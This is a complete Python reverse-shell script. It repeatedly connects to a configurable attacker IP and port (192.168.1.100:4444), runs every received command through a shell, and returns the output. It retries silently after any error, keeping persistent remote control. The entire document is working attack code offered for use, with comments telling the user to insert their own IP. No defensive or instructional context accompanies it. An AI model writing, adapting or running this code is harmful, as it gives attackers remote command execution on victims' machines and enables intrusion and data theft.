import socket
import subprocess
import os
import time
import sys

# Change this to attacker's IP and port
ATTACKER_IP = "192.168.1.100"  # Change to your IP
ATTACKER_PORT = 4444

def connect_to_attacker():
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            while True:
                # Receive command
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break
                
                # Execute command
                output = subprocess.run(command, shell=True, capture_output=True)
                result = output.stdout + output.stderr
                
                # Send result back
                s.send(result if result else b'Executed successfully')
            
            s.close()
        
        except Exception as e:
            time.sleep(5)  # Retry after delay

if __name__ == "__main__":
    connect_to_attacker()
